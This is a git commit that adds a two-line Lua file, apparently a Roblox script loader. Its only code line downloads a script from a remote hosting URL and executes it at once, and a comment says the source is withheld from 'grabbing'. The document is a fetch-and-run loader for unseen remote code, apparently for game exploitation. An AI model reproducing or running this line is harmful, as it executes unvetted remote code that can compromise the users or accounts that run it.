4eca8a75583d01476524a739d5db09733624c634
TryToFindMeNowNicker <DarkBerryBashLegacy@gmail.com>
2025-11-05 17:07:43 +0300

    Create LoaderSTC.lua

---
+++ LoaderSTC.lua
@@ -0,0 +1,2 @@
+-- no grabbing srry :(
+loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/adf6656573a00b4fad920c35c63341068198825e47b83b9c8a209d3922d56c2c/download"))()
